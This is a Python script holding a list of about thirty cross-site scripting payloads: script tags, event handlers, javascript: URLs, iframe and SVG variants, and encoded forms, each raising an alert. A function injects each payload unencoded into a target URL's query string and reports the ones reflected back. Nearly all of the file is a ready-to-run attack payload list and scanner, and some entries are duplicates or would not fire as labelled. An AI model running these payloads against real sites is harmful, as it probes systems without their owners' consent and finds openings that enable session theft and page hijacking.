import requests

# Refined XSS payloads
XSS_PAYLOADS = [
    {"name": "Basic Script Alert", "payload": "<script>alert('hijack.network')</script>"},
    {"name": "Image Tag with Error Handling", "payload": "<img src=x onerror=alert('hijack.network')>"},
    {"name": "JavaScript URL Scheme", "payload": "javascript:alert('hijack.network')"},
    {"name": "Double Script Injection", "payload": "<script>alert('hijack.network')</script><script>alert('hijack.network')</script>"},
    {"name": "Event Handler in Anchor Tag", "payload": "<a href=\"#\" onclick=\"alert('hijack.network')\">Click me</a>"},
    {"name": "Data URI with JavaScript", "payload": "<img src=\"data:image/svg+xml,<svg/onload=alert('hijack.network')>\">"},
    {"name": "SVG with JavaScript", "payload": "<svg onload=\"alert('hijack.network')\"></svg>"},
    {"name": "Iframe Injection", "payload": "<iframe src=\"javascript:alert('hijack.network')\"></iframe>"},
    {"name": "Document.URL Scheme", "payload": "<a href=\"data:text/html,<script>alert('hijack.network')</script>\">Link</a>"},
    {"name": "Base64 Encoded JavaScript", "payload": "<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAB0lEQVR42mP8/wcAAwAB/9IAgAAAABJRU5ErkJggg==\">"},
    {"name": "XSS via HTML Attribute Injection", "payload": "<div title=\"x onmouseover=alert('hijack.network')\">Hover me</div>"},
    {"name": "JavaScript Event with HTML Entities", "payload": "<div onclick=\"alert(&#39;hijack.network&#39;)\">Click me</div>"},
    {"name": "JavaScript in CSS Attribute", "payload": "<div style=\"background-image: url(javascript:alert('hijack.network'));\">Hello</div>"},
    {"name": "Meta Tag Injection", "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('hijack.network')\">"},
    {"name": "Onerror with JavaScript URL", "payload": "<script src=\"javascript:alert('hijack.network')\"></script>"},
    {"name": "Hexadecimal Encoding", "payload": "<script>alert(String.fromCharCode(88,83,83))</script>"},
    {"name": "Unicode Encoding", "payload": "<script>\u0061lert(\u0027hijack.network\u0027)</script>"},
    {"name": "JavaScript String Concatenation", "payload": "<script>var a=\"al\";var b=\"ert\";eval(a+b+\"('hijack.network')\");</script>"},
    {"name": "HTML Entities", "payload": "&lt;script&gt;alert(&#39;hijack.network&#39;)&lt;/script&gt;"},
    {"name": "Double Encoding", "payload": "%3Cscript%3Ealert(%27hijack.network%27)%3C/script%3E"},
    {"name": "Dynamic Script Injection", "payload": "<img src=\"x\" onerror=\"this.src='data:text/html,<script>alert('hijack.network')</script>'\">"},
    {"name": "Attribute Injection with JavaScript URL", "payload": "<a href=\"javascript:alert('hijack.network')\">Click me</a>"},
    {"name": "Onmouseover Event", "payload": "<div onmouseover=\"alert('hijack.network')\">Hover me</div>"},
    {"name": "Using src Attribute with Base64 Encoding", "payload": "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSIvPg==\" />"},
    {"name": "SVG Payloads", "payload": "<svg onload=\"alert('hijack.network')\"></svg>"},
    {"name": "HTML5 Data Attributes", "payload": "<div data-attr=\"a onmouseover=alert('hijack.network')\">Hover over me</div>"},
    {"name": "Using document.write()", "payload": "<img src=\"x\" onerror=\"document.write('<script>alert(\'hijack.network\')<\/script>')\">"},
    {"name": "Meta Refresh with JavaScript", "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('hijack.network')\">"},
    {"name": "Sandbox Bypass with Inline Frames", "payload": "<iframe src=\"javascript:alert('hijack.network')\"></iframe>"},
    {"name": "Using srcdoc Attribute in <iframe>", "payload": "<iframe srcdoc=\"<script>alert('hijack.network')</script>\"></iframe>"}
]

def check_xss(url):
    results = []
    for item in XSS_PAYLOADS:
        payload = item["payload"]
        test_url = f"{url}?test={payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                results.append({
                    "name": item["name"],
                    "url": test_url,
                    "payload": payload
                })
        except Exception as e:
            results.append({
                "name": "Error",
                "url": "",
                "payload": f"Error testing {test_url}: {str(e)}"
            })
    return results
